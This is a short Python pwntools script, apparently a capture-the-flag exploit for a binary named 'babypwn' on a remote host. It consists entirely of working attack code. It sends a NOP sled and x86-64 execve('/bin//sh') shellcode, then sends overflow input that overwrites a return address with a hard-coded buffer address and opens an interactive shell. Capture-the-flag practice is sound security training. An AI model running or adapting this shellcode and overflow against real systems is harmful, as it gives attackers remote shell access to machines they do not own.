from pwn import *

#p=process('./babypwn')
p=remote('stack.overflow.fail',9000)

payload="\x90"*70
payload+="\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
print(p.recv(2020))
p.sendline(payload)

print(p.recv(2020))
p.sendline("+")
print(p.recv(2020))
p.sendline("3"*0x4F+"+"+"AAAAAAAA"+p64(0x00000000006010a0))
print(p.recv(2020))
p.sendline("3")
print(p.recv(2020))
p.interactive()
